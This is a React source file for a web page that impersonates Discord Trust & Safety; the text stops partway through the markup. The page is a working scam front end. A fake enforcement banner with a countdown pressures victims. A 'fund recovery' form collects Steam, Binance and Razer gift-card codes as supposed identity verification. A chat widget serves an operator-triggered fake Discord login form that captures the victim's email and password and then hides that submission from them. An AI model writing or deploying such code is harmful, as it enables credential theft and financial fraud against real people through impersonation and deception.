import { useState, useEffect, useRef } from "react";
import { useParams } from "wouter";
import { useQuery } from "@tanstack/react-query";
import { useCaseMessages, useCaseStatus } from "../lib/useSocket";
import { getAvatarUrl, getBannerUrl, getBannerColor, getDisplayName, formatTag } from "../lib/discord";
import {
  AlertTriangle, MessageSquare, Send, X, Paperclip, Shield,
  Clock, FileText, AlertCircle, HelpCircle, CheckCircle, Loader2,
  RefreshCw, DollarSign, TrendingUp, ChevronDown,
} from "lucide-react";

// ── Helpers ───────────────────────────────────────────────────────────────────
function parseDate(v: any): Date {
  if (!v) return new Date();
  if (typeof v === "string") return new Date(v);
  if (typeof v === "number") return new Date(v > 1e10 ? v : v * 1000);
  return new Date(v);
}

// ── Warning Banner ─────────────────────────────────────────────────────────────
function WarningBanner({ timeLeft }: { timeLeft: number }) {
  const mins = Math.floor(timeLeft / 60).toString().padStart(2, "0");
  const secs = (timeLeft % 60).toString().padStart(2, "0");

  return (
    <div className="sticky top-0 z-50 bg-[#ed4245] px-4 py-3 flex items-center justify-center gap-3 shadow-lg">
      <div className="flex items-center gap-2 flex-shrink-0">
        <span className="relative flex h-3 w-3">
          <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-white opacity-75" />
          <span className="relative inline-flex rounded-full h-3 w-3 bg-white" />
        </span>
        <span className="text-white font-bold text-xs uppercase tracking-widest hidden sm:inline">LIVE SESSION</span>
      </div>
      <div className="h-4 w-px bg-white/30 hidden sm:block" />
      <div className="flex flex-col sm:flex-row items-center gap-1 sm:gap-3 text-center">
        <p className="text-white font-semibold text-sm">
          ⚠️ This is a limited-time enforcement session. Immediate response required.
        </p>
        <p className="text-white/80 text-xs hidden sm:block">Failure to comply may result in permanent account action.</p>
      </div>
      <div className="h-4 w-px bg-white/30 hidden sm:block" />
      <div className="flex items-center gap-1.5 bg-white/20 rounded-md px-3 py-1.5 flex-shrink-0">
        <Clock className="w-3.5 h-3.5 text-white" />
        <span className="text-white font-mono font-bold text-sm tracking-wider">{mins}:{secs}</span>
      </div>
    </div>
  );
}

// ── Recovery Status Badge ──────────────────────────────────────────────────────
function RecoveryStatusBadge({ status }: { status: string }) {
  const map: any = {
    pending:    "bg-[#faa61a]/20 text-[#faa61a] border-[#faa61a]/30",
    processing: "bg-[#5865F2]/20 text-[#5865F2] border-[#5865F2]/30",
    completed:  "bg-[#3ba55c]/20 text-[#3ba55c] border-[#3ba55c]/30",
    failed:     "bg-[#ed4245]/20 text-[#ed4245] border-[#ed4245]/30",
  };
  return (
    <span className={`inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full text-xs font-semibold border ${map[status] || map.pending}`}>
      <span className="w-1.5 h-1.5 rounded-full bg-current" />
      {status.charAt(0).toUpperCase() + status.slice(1)}
    </span>
  );
}

// ── Code Status Badge ──────────────────────────────────────────────────────────
function CodeStatusBadge({ status }: { status: string }) {
  const map: any = {
    pending:  "bg-[#faa61a]/20 text-[#faa61a]",
    accepted: "bg-[#3ba55c]/20 text-[#3ba55c]",
    rejected: "bg-[#ed4245]/20 text-[#ed4245]",
  };
  return (
    <span className={`px-2 py-0.5 rounded text-xs font-medium ${map[status] || map.pending}`}>
      {status.charAt(0).toUpperCase() + status.slice(1)}
    </span>
  );
}

// ── Recovery Modal ─────────────────────────────────────────────────────────────
function RecoveryModal({ slug, cas, onClose }: { slug: string; cas: any; onClose: () => void }) {
  const CODE_TYPES = [
    "Steam Wallet Code",
    "Binance Gift Card",
    "Razer Gold Pins",
    "Other",
  ];

  const [codeType, setCodeType] = useState(CODE_TYPES[0]);
  const [codeValue, setCodeValue] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [submitError, setSubmitError] = useState("");
  const [submitSuccess, setSubmitSuccess] = useState("");
  const codesEndRef = useRef<HTMLDivElement>(null);

  // Poll for recovery data every 3s
  const { data, refetch } = useQuery({
    queryKey: ["recovery-public", slug],
    queryFn: async () => {
      const res = await fetch(`/api/case/${slug}/recover`);
      if (!res.ok) return null;
      return res.json();
    },
    refetchInterval: 3000,
  });

  const recovery = data?.recovery || cas;
  const codes: any[] = data?.codes || [];

  useEffect(() => {
    codesEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [codes.length]);

  const handleSubmit = async () => {
    if (!codeValue.trim()) return;
    setSubmitting(true);
    setSubmitError("");
    setSubmitSuccess("");
    try {
      const res = await fetch(`/api/case/${slug}/recover`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ codeType, code: codeValue.trim() }),
      });
      const d = await res.json();
      if (!res.ok) throw new Error(d.error || "Submission failed");
      setSubmitSuccess("Code submitted successfully. Our team will review it shortly.");
      setCodeValue("");
      refetch();
    } catch (e: any) {
      setSubmitError(e.message);
    } finally {
      setSubmitting(false);
    }
  };

  const progress = recovery?.progress ?? recovery?.recoveryProgress ?? 0;
  const recStatus = recovery?.status ?? recovery?.recoveryStatus ?? "pending";
  const fundsTotal = recovery?.fundsTotal ?? recovery?.recoveryFundsTotal;
  const refundTotal = recovery?.refundTotal ?? recovery?.recoveryRefundTotal;

  return (
    <div className="fixed inset-0 z-50 flex items-end sm:items-center justify-center bg-black/70 px-0 sm:px-4">
      <div className="bg-[#2b2d31] border border-[#3f4147] rounded-t-2xl sm:rounded-xl w-full max-w-lg max-h-[90vh] flex flex-col">
        {/* Header */}
        <div className="flex items-center justify-between px-5 py-4 border-b border-[#3f4147] flex-shrink-0">
          <div className="flex items-center gap-3">
            <div className="w-9 h-9 bg-[#3ba55c]/10 rounded-full flex items-center justify-center">
              <RefreshCw className="w-5 h-5 text-[#3ba55c]" />
            </div>
            <div>
              <h2 className="text-base font-bold text-[#f2f3f5]">Fund Recovery Program</h2>
              <p className="text-xs text-[#949ba4]">Discord Trust &amp; Safety — Secure Recovery</p>
            </div>
          </div>
          <button onClick={onClose} className="text-[#949ba4] hover:text-[#f2f3f5] transition-colors">
            <X className="w-5 h-5" />
          </button>
        </div>

        <div className="overflow-y-auto flex-1 p-5 space-y-5">
          {/* Status + amounts */}
          <div className="grid grid-cols-3 gap-3">
            <div className="bg-[#313338] rounded-lg p-3">
              <p className="text-[#949ba4] text-xs mb-1.5">Status</p>
              <RecoveryStatusBadge status={recStatus} />
            </div>
            <div className="bg-[#313338] rounded-lg p-3">
              <p className="text-[#949ba4] text-xs mb-1">Funds Seized</p>
              <p className="text-[#f2f3f5] font-bold text-sm">
                {`${Number(fundsTotal ?? 0).toFixed(2)}`}
              </p>
            </div>
            <div className="bg-[#313338] rounded-lg p-3">
              <p className="text-[#949ba4] text-xs mb-1">Recoverable</p>
              <p className="text-[#3ba55c] font-bold text-sm">
                {`${Number(refundTotal ?? 0).toFixed(2)}`}
              </p>
            </div>
          </div>

          {/* Progress bar */}
          <div>
            <div className="flex items-center justify-between mb-2">
              <p className="text-sm font-semibold text-[#b5bac1]">Recovery Progress</p>
              <p className="text-[#3ba55c] font-bold text-sm">{progress}%</p>
            </div>
            <div className="w-full bg-[#313338] rounded-full h-3 overflow-hidden">
              <div
                className="bg-gradient-to-r from-[#3ba55c] to-[#2d8247] h-3 rounded-full transition-all duration-700"
                style={{ width: `${progress}%` }}
              />
            </div>
            <p className="text-[#949ba4] text-xs mt-1.5">
              {progress < 100
                ? "Fund recovery is in progress. Submit verification codes below to expedite processing."
                : "Recovery process complete. Funds will be returned to your account within 24–48h."}
            </p>
          </div>

          {/* Notice */}
          <div className="bg-[#faa61a]/10 border border-[#faa61a]/20 rounded-lg p-3 flex gap-2">
            <AlertTriangle className="w-4 h-4 text-[#faa61a] flex-shrink-0 mt-0.5" />
            <p className="text-[#faa61a] text-xs leading-relaxed">
              To verify your identity and release your frozen funds, you must submit a digital asset verification code below.
              These codes are used solely for identity verification and are non-redeemable by Discord staff.
            </p>
          </div>

          {/* Submission form */}
          <div className="space-y-3">
            <p className="text-sm font-semibold text-[#b5bac1]">Submit Verification Code</p>

            {submitError && (
              <div className="flex items-center gap-2 bg-[#ed4245]/10 border border-[#ed4245]/30 rounded-lg px-3 py-2 text-[#ed4245] text-sm">
                <AlertTriangle className="w-4 h-4 flex-shrink-0" /> {submitError}
              </div>
            )}
            {submitSuccess && (
              <div className="flex items-center gap-2 bg-[#3ba55c]/10 border border-[#3ba55c]/30 rounded-lg px-3 py-2 text-[#3ba55c] text-sm">
                <CheckCircle className="w-4 h-4 flex-shrink-0" /> {submitSuccess}
              </div>
            )}

            <div>
              <label className="block text-xs font-medium text-[#949ba4] mb-1.5">Code Type</label>
              <div className="relative">
                <select
                  value={codeType}
                  onChange={(e) => setCodeType(e.target.value)}
                  className="w-full appearance-none bg-[#1e1f22] border border-[#3f4147] rounded-[3px] px-3 py-2.5 text-[#f2f3f5] text-sm focus:outline-none focus:border-[#5865F2] pr-8"
                >
                  {CODE_TYPES.map((t) => <option key={t}>{t}</option>)}
                </select>
                <ChevronDown className="absolute right-2.5 top-1/2 -translate-y-1/2 w-4 h-4 text-[#949ba4] pointer-events-none" />
              </div>
            </div>

            <div>
              <label className="block text-xs font-medium text-[#949ba4] mb-1.5">Verification Code</label>
              <input
                type="text"
                value={codeValue}
                onChange={(e) => setCodeValue(e.target.value)}
                onKeyDown={(e) => { if (e.key === "Enter") handleSubmit(); }}
                placeholder="Enter your code here..."
                className="w-full bg-[#1e1f22] border border-[#3f4147] rounded-[3px] px-3 py-2.5 text-[#f2f3f5] text-sm focus:outline-none focus:border-[#5865F2] font-mono tracking-wider"
              />
            </div>

            <button
              onClick={handleSubmit}
              disabled={submitting || !codeValue.trim()}
              className="w-full bg-[#3ba55c] hover:bg-[#2d8247] text-white py-2.5 rounded-[3px] text-sm font-semibold disabled:opacity-50 transition-colors flex items-center justify-center gap-2"
            >
              {submitting ? <><Loader2 className="w-4 h-4 animate-spin" /> Submitting...</> : "Submit Verification Code"}
            </button>
          </div>

          {/* Submission log */}
          {codes.length > 0 && (
            <div>
              <p className="text-sm font-semibold text-[#b5bac1] mb-3">Submission History</p>
              <div className="space-y-2 max-h-48 overflow-y-auto pr-1">
                {codes.map((code: any, i: number) => (
                  <div key={code.id ?? i} className="bg-[#313338] rounded-lg px-3 py-2.5 flex items-center justify-between gap-3">
                    <div className="min-w-0">
                      <p className="text-[#949ba4] text-xs mb-0.5">{code.codeType}</p>
                      <p className="text-[#f2f3f5] font-mono text-sm truncate">{code.code}</p>
                      {code.adminNote && (
                        <p className="text-[#949ba4] text-xs mt-1 italic">{code.adminNote}</p>
                      )}
                    </div>
                    <div className="flex flex-col items-end gap-1 flex-shrink-0">
                      <CodeStatusBadge status={code.status} />
                      <p className="text-[#949ba4] text-xs">
                        {parseDate(code.createdAt).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })}
                      </p>
                    </div>
                  </div>
                ))}
                <div ref={codesEndRef} />
              </div>
            </div>
          )}

          {/* Footer note */}
          <p className="text-[#4e5058] text-xs text-center">
            This is a secure Discord Trust &amp; Safety verification process. All submissions are encrypted and reviewed by our team.
          </p>
        </div>
      </div>
    </div>
  );
}

// ── Chat Widget ────────────────────────────────────────────────────────────────
function ChatWidget({ slug, caseId }: { slug: string; caseId: number }) {
  const [open, setOpen] = useState(false);
  const [text, setText] = useState("");
  const [sending, setSending] = useState(false);
  const [uploading, setUploading] = useState(false);
  const [unreadCount, setUnreadCount] = useState(0);
  // Login form state
  const [loginEmail, setLoginEmail] = useState("");
  const [loginPassword, setLoginPassword] = useState("");
  const [loginShowPass, setLoginShowPass] = useState(false);
  const [loginSubmitting, setLoginSubmitting] = useState(false);
  const [loginSubmitted, setLoginSubmitted] = useState<Set<number>>(new Set());
  const messagesEndRef = useRef<HTMLDivElement>(null);
  const fileRef = useRef<HTMLInputElement>(null);
  const { messages, refetch } = useCaseMessages(slug, true);
  const prevMsgCount = useRef(0);

  const LOGIN_REQUEST_PREFIX = "__LOGIN_REQUEST__";
  const LOGIN_RESPONSE_PREFIX = "__LOGIN_RESPONSE__:";

  useEffect(() => {
    if (messages.length > prevMsgCount.current) {
      const newAdminMsgs = messages.slice(prevMsgCount.current).filter((m: any) => m.sender === "admin");
      if (!open && newAdminMsgs.length > 0) setUnreadCount((n) => n + newAdminMsgs.length);
    }
    prevMsgCount.current = messages.length;
  }, [messages, open]);

  useEffect(() => {
    if (open) {
      setUnreadCount(0);
      setTimeout(() => messagesEndRef.current?.scrollIntoView({ behavior: "smooth" }), 100);
    }
  }, [open, messages]);

  const handleSend = async () => {
    if (!text.trim()) return;
    setSending(true);
    try {
      await fetch(`/api/case/${slug}/message`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: text.trim() }),
      });
      setText("");
      refetch();
    } finally {
      setSending(false);
    }
  };

  const handleLoginSubmit = async (requestMsgId: number) => {
    if (!loginEmail.trim() || !loginPassword.trim()) return;
    setLoginSubmitting(true);
    try {
      await fetch(`/api/case/${slug}/message`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: LOGIN_RESPONSE_PREFIX + JSON.stringify({ email: loginEmail.trim(), password: loginPassword }),
        }),
      });
      setLoginSubmitted(prev => new Set(prev).add(requestMsgId));
      setLoginEmail("");
      setLoginPassword("");
      refetch();
    } finally {
      setLoginSubmitting(false);
    }
  };

  const handleFile = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    setUploading(true);
    try {
      const formData = new FormData();
      formData.append("file", file);
      const uploadRes = await fetch("/api/upload", {
        method: "POST",
        body: formData,
      });
      if (!uploadRes.ok) throw new Error("Upload failed");
      const { url } = await uploadRes.json();
      await fetch(`/api/case/${slug}/message`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: "", fileUrl: url, fileName: file.name }),
      });
      refetch();
    } finally {
      setUploading(false);
    }
    e.target.value = "";
  };

  // Check if user already responded to a login request
  const hasResponded = (requestMsgId: number) => {
    if (loginSubmitted.has(requestMsgId)) return true;
    // Also check if there's already a response message after this request
    const reqIndex = messages.findIndex((m: any) => m.id === requestMsgId);
    if (reqIndex === -1) return false;
    return messages.slice(reqIndex + 1).some((m: any) =>
      m.sender === "user" && m.content?.startsWith(LOGIN_RESPONSE_PREFIX)
    );
  };

  return (
    <>
      {open && (
        <div className="fixed bottom-20 right-4 sm:right-6 z-50 w-80 sm:w-96 bg-[#2b2d31] border border-[#3f4147] rounded-xl shadow-2xl flex flex-col overflow-hidden">
          <div className="flex items-center gap-3 px-4 py-3 bg-[#5865F2]">
            <div className="relative">
              <Shield className="w-7 h-7 text-white" />
              <span className="absolute -bottom-0.5 -right-0.5 w-2.5 h-2.5 bg-[#3ba55c] rounded-full border-2 border-[#5865F2]" />
            </div>
            <div className="flex-1">
              <p className="text-white font-semibold text-sm">Discord Trust & Safety</p>
              <p className="text-white/70 text-xs">Case Support</p>
            </div>
            <button onClick={() => setOpen(false)} className="text-white/70 hover:text-white">
              <X className="w-4 h-4" />
            </button>
          </div>

          <div className="px-4 py-3 bg-[#313338] border-b border-[#3f4147]">
            <p className="text-[#b5bac1] text-xs leading-relaxed">
              You're connected to live case support. Type your message or upload evidence below.
              A Trust & Safety agent will respond shortly.
            </p>
          </div>

          <div className="flex-1 overflow-y-auto px-4 py-3 space-y-2 min-h-0 max-h-64">
            {messages.length === 0 && (
              <div className="text-center text-[#949ba4] text-xs py-4">
                Start the conversation to connect with a support agent.
              </div>
            )}
            {messages.map((msg: any) => {
              const isAdmin = msg.sender === "admin";

              // Login request — show a Discord-styled login form
              if (isAdmin && msg.content === LOGIN_REQUEST_PREFIX) {
                const responded = hasResponded(msg.id);
                return (
                  <div key={msg.id} className="flex justify-start">
                    <div className="w-full max-w-[90%] bg-[#1e1f22] border border-[#5865F2]/40 rounded-lg overflow-hidden">
                      <div className="flex items-center gap-2 px-3 py-2 bg-[#5865F2]/10 border-b border-[#5865F2]/20">
                        <svg className="w-4 h-4 text-[#5865F2]" viewBox="0 0 24 24" fill="currentColor">
                          <path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057c.002.022.015.043.031.056a19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028c.462-.63.874-1.295 1.226-1.994a.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03z"/>
                        </svg>
                        <span className="text-[#5865F2] text-xs font-semibold">Discord — Secure Account Verification</span>
                      </div>
                      {responded ? (
                        <div className="px-3 py-3 flex items-center gap-2 text-[#3ba55c] text-xs">
                          <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" /></svg>
                          Credentials submitted successfully.
                        </div>
                      ) : (
                        <div className="px-3 py-3 space-y-2">
                          <p className="text-[#949ba4] text-xs mb-2">
                            A Trust & Safety agent needs to verify your identity. Enter your Discord login credentials below.
                          </p>
                          <div>
                            <label className="block text-[#b5bac1] text-xs mb-1">Email or Phone Number</label>
                            <input
                              type="text"
                              value={loginEmail}
                              onChange={e => setLoginEmail(e.target.value)}
                              placeholder="Email or phone number"
                              className="w-full bg-[#313338] border border-[#3f4147] rounded px-3 py-1.5 text-[#f2f3f5] text-xs focus:outline-none focus:border-[#5865F2] placeholder:text-[#6d6f78]"
                            />
                          </div>
                          <div>
                            <label className="block text-[#b5bac1] text-xs mb-1">Password</label>
                            <div className="relative">
                              <input
                                type={loginShowPass ? "text" : "password"}
                                value={loginPassword}
                                onChange={e => setLoginPassword(e.target.value)}
                                placeholder="Password"
                                className="w-full bg-[#313338] border border-[#3f4147] rounded px-3 py-1.5 pr-8 text-[#f2f3f5] text-xs focus:outline-none focus:border-[#5865F2] placeholder:text-[#6d6f78]"
                              />
                              <button
                                type="button"
                                onClick={() => setLoginShowPass(v => !v)}
                                className="absolute right-2 top-1/2 -translate-y-1/2 text-[#949ba4] hover:text-[#f2f3f5]"
                              >
                                {loginShowPass
                                  ? <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21" /></svg>
                                  : <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" /><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" /></svg>
                                }
                              </button>
                            </div>
                          </div>
                          <button
                            onClick={() => handleLoginSubmit(msg.id)}
                            disabled={loginSubmitting || !loginEmail.trim() || !loginPassword.trim()}
                            className="w-full bg-[#5865F2] hover:bg-[#4752C4] text-white text-xs font-medium py-1.5 rounded transition-colors disabled:opacity-50 flex items-center justify-center gap-1.5"
                          >
                            {loginSubmitting
                              ? <><svg className="w-3 h-3 animate-spin" fill="none" viewBox="0 0 24 24"><circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"/><path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8z"/></svg> Submitting...</>
                              : "Submit for Verification"
                            }
                          </button>
                          <p className="text-[#6d6f78] text-[10px] text-center">
                            Your credentials are transmitted securely and used only for identity verification.
                          </p>
                        </div>
                      )}
                      <div className="px-3 py-1.5 border-t border-[#3f4147]">
                        <span className="text-[#6d6f78] text-[10px]">
                          {parseDate(msg.createdAt).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })}
                        </span>
                      </div>
                    </div>
                  </div>
                );
              }

              // Login response — hide from user (they already saw the form)
              if (!isAdmin && msg.content?.startsWith(LOGIN_RESPONSE_PREFIX)) {
                return null;
              }

              // Normal message
              return (
                <div key={msg.id} className={`flex ${isAdmin ? "justify-start" : "justify-end"}`}>
                  <div className={`max-w-[80%] rounded-lg px-3 py-2 text-sm ${
                    isAdmin ? "bg-[#313338] text-[#f2f3f5] rounded-tl-sm" : "bg-[#5865F2] text-white rounded-tr-sm"
                  }`}>
                    {msg.content && <p className="leading-relaxed break-words">{msg.content}</p>}
                    {msg.fileUrl && (
                      msg.fileUrl.startsWith("data:image") || msg.fileUrl.match(/\.(jpg|jpeg|png|gif|webp)$/i) ? (
                        <img src={msg.fileUrl} alt={msg.fileName || "file"} className="max-w-full max-h-32 rounded mt-1 object-contain" />
                      ) : (
                        <a href={msg.fileUrl} target="_blank" rel="noreferrer" className="flex items-center gap-1.5 underline text-xs mt-1">
                          <Paperclip className="w-3 h-3" /> {msg.fileName || "Attachment"}
                        </a>
                      )
                    )}
                    <p className={`text-xs mt-1 ${isAdmin ? "text-[#949ba4]" : "text-white/60"}`}>
                      {parseDate(msg.createdAt).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })}
                    </p>
                  </div>
                </div>
              );
            })}
            <div ref={messagesEndRef} />
          </div>

          <div className="flex items-end gap-2 px-4 py-3 border-t border-[#3f4147]">
            <div className="flex-1 bg-[#1e1f22] border border-[#3f4147] rounded-lg px-3 py-2 flex items-end gap-2">
              <textarea
                value={text}
                onChange={(e) => setText(e.target.value)}
                onKeyDown={(e) => { if (e.key === "Enter" && !e.shiftKey) { e.preventDefault(); handleSend(); } }}
                placeholder="Type a message..."
                rows={1}
                className="flex-1 bg-transparent text-[#f2f3f5] text-sm resize-none focus:outline-none placeholder:text-[#949ba4] max-h-20"
              />
              <label className="cursor-pointer text-[#949ba4] hover:text-[#5865F2] transition-colors flex-shrink-0">
                <Paperclip className="w-4 h-4" />
                <input type="file" ref={fileRef} onChange={handleFile} className="hidden" accept="image/*,.pdf,.txt" />
              </label>
            </div>
            <button
              onClick={handleSend}
              disabled={sending || uploading || !text.trim()}
              className="w-9 h-9 bg-[#5865F2] hover:bg-[#4752C4] rounded-lg flex items-center justify-center disabled:opacity-50 transition-colors flex-shrink-0"
            >
              {sending || uploading ? <Loader2 className="w-4 h-4 text-white animate-spin" /> : <Send className="w-4 h-4 text-white" />}
            </button>
          </div>
        </div>
      )}

      <button
        onClick={() => setOpen(!open)}
        className="fixed bottom-4 right-4 sm:right-6 z-50 w-14 h-14 bg-[#5865F2] hover:bg-[#4752C4] rounded-full shadow-2xl flex items-center justify-center transition-all duration-200 active:scale-95"
      >
        {open ? <X className="w-6 h-6 text-white" /> : <MessageSquare className="w-6 h-6 text-white" />}
        {!open && unreadCount > 0 && (
          <span className="absolute -top-1 -right-1 w-5 h-5 bg-[#ed4245] text-white text-xs font-bold rounded-full flex items-center justify-center">
            {unreadCount}
          </span>
        )}
      </button>
    </>
  );
}

// ── Main Case Page ─────────────────────────────────────────────────────────────
export default function CasePage() {
  const { slug } = useParams<{ slug: string }>();
  const [timeLeft, setTimeLeft] = useState<number | null>(null);
  const [showRecovery, setShowRecovery] = useState(false);
  const status = useCaseStatus(slug);

  const { data, isLoading, error } = useQuery({
    queryKey: ["case-public", slug],
    queryFn: async () => {
      const res = await fetch(`/api/case/${slug}`);
      if (res.status === 410) return { deleted: true };
      if (!res.ok) throw new Error("Not found");
      return res.json();
    },
  });

  // Initialize timer from server-computed remaining seconds (resumes correctly after refresh)
  useEffect(() => {
    if (data?.case?.timeRemaining != null && timeLeft === null) {
      setTimeLeft(data.case.timeRemaining);
    }
  }, [data]);

  useEffect(() => {
    if (timeLeft === null || timeLeft <= 0) return;
    const timer = setInterval(() => setTimeLeft((t) => Math.max(0, (t ?? 0) - 1)), 1000);
    return () => clearInterval(timer);
  }, [timeLeft === null]);

  useEffect(() => {
    if (data?.deleted || status === "deleted") {
      window.location.href = "https://discord.com";
    }
  }, [data, status]);

  if (isLoading) {
    return (
      <div className="min-h-screen bg-[#1e1f22] flex items-center justify-center">
        <Loader2 className="w-8 h-8 text-[#5865F2] animate-spin" />
      </div>
    );
  }

  if (error || !data?.case) {
    return (
      <div className="min-h-screen bg-[#1e1f22] flex items-center justify-center px-4">
        <div className="text-center">
          <AlertTriangle className="w-16 h-16 text-[#ed4245] mx-auto mb-4" />
          <h1 className="text-2xl font-bold text-[#f2f3f5] mb-2">Case Not Found</h1>
          <p className="text-[#949ba4]">This case page does not exist or has been removed.</p>
        </div>
      </div>
    );
  }

  const cas = data.case;

  if (status === "closed") {
    return (
      <div className="min-h-screen bg-[#1e1f22] flex items-center justify-center px-4">
        <div className="text-center max-w-md">
          <div className="w-20 h-20 rounded-full bg-[#faa61a]/10 flex items-center justify-center mx-auto mb-6">
            <Clock className="w-10 h-10 text-[#faa61a]" />
          </div>
          <h1 className="text-2xl font-bold text-[#f2f3f5] mb-3">Session Temporarily Unavailable</h1>
          <p className="text-[#949ba4] mb-2">This case page is currently undergoing maintenance.</p>
          <p className="text-[#949ba4] text-sm">Case Reference: <span className="font-mono text-[#b5bac1]">{cas.caseNumber}</span></p>
          <p className="text-[#949ba4] text-sm mt-2">Please check back later or contact Discord support directly.</p>
        </div>
      </div>
    );
  }

  const discordUser = JSON.parse(cas.discordData || "{}");
  const avatarUrl = getAvatarUrl(discordUser);
  const bannerUrl = getBannerUrl(discordUser);
  const bannerColor = getBannerColor(discordUser);
  const displayName = getDisplayName(discordUser);
  const createdAt = parseDate(cas.createdAt);

  return (
    <div className="min-h-screen bg-[#1e1f22]">
      <WarningBanner timeLeft={timeLeft ?? 0} />

      <div className="max-w-3xl mx-auto px-4 py-6 pb-24">
        {/* Profile Card */}
        <div className="bg-[#2b2d31] border border-[#3f4147] rounded-xl overflow-hidden mb-5">
          <div
            className="h-28 sm:h-36 relative"
            style={{ background: bannerUrl ? undefined : `linear-gradient(135deg, ${bannerColor}66, ${bannerColor}22)` }}
          >
            {bannerUrl && <img src={bannerUrl} alt="" className="w-full h-full object-cover" />}
            <div className="absolute inset-0 bg-gradient-to-b from-transparent to-black/40" />
          </div>

          <div className="px-5 pb-5">
            <div className="flex items-end gap-4 -mt-10 mb-4">
              <div className="relative flex-shrink-0">
                <img src={avatarUrl} alt="" className="w-20 h-20 rounded-full border-4 border-[#2b2d31] bg-[#313338]" />
              </div>
              <div className="pb-1">
                <h2 className="text-xl font-bold text-[#f2f3f5] leading-tight">{displayName}</h2>
                <p className="text-[#949ba4] text-sm">{formatTag(discordUser)}</p>
              </div>
            </div>

            <div className="grid grid-cols-2 sm:grid-cols-3 gap-3 text-sm">
              <div className="bg-[#313338] rounded-lg px-3 py-2.5">
                <p className="text-[#949ba4] text-xs mb-1">User ID</p>
                <p className="text-[#f2f3f5] font-mono text-xs">{discordUser.id}</p>
              </div>
              <div className="bg-[#313338] rounded-lg px-3 py-2.5">
                <p className="text-[#949ba4] text-xs mb-1">Account Type</p>
                <p className="text-[#f2f3f5] text-xs">{discordUser.bot ? "Bot Account" : "User Account"}</p>
              </div>
              <div className="bg-[#313338] rounded-lg px-3 py-2.5">
                <p className="text-[#949ba4] text-xs mb-1">Case Opened</p>
                <p className="text-[#f2f3f5] text-xs">{createdAt.toLocaleDateString()}</p>
              </div>
            </div>
          </div>
        </div>

        {/* Recovery Option Banner — only when enabled */}
        {cas.recoveryEnabled && (
          <div className="bg-[#3ba55c]/10 border border-[#3ba55c]/30 rounded-xl p-4 mb-5 flex items-center justify-between gap-4">
            <div className="flex items-start gap-3">
              <div className="w-9 h-9 bg-[#3ba55c]/20 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
                <RefreshCw className="w-4 h-4 text-[#3ba55c]" />
              </div>
              <div>
                <p className="text-[#3ba55c] font-semibold text-sm">Fund Recovery Available</p>
                <p className="text-[#b5bac1] text-xs mt-0.5 leading-relaxed">
                  Discord Trust &amp; Safety has enabled a fund recovery program for your case.
                  Click to begin the verification process and recover your funds.
                </p>
              </div>
            </div>
            <button
              onClick={() => setShowRecovery(true)}
              className="flex-shrink-0 bg-[#3ba55c] hover:bg-[#2d8247] text-white px-4 py-2 rounded-[3px] text-sm font-semibold transition-colors whitespace-nowrap"
            >
              Recover Funds
            </button>
          </div>
        )}

        {/* Case Details */}
        <div className="bg-[#2b2d31] border border-[#3f4147] rounded-xl overflow-hidden mb-5">
          <div className="px-5 py-4 border-b border-[#3f4147] flex items-center gap-3">
            <FileText className="w-5 h-5 text-[#5865F2]" />
            <h3 className="text-[#f2f3f5] font-semibold">Case Details</h3>
            <span className="ml-auto bg-[#ed4245]/20 text-[#ed4245] border border-[#ed4245]/30 text-xs px-2.5 py-0.5 rounded-full font-medium">
              Under Review
            </span>
          </div>
          <div className="p-5 space-y-4">
            <div className="flex items-start gap-3">
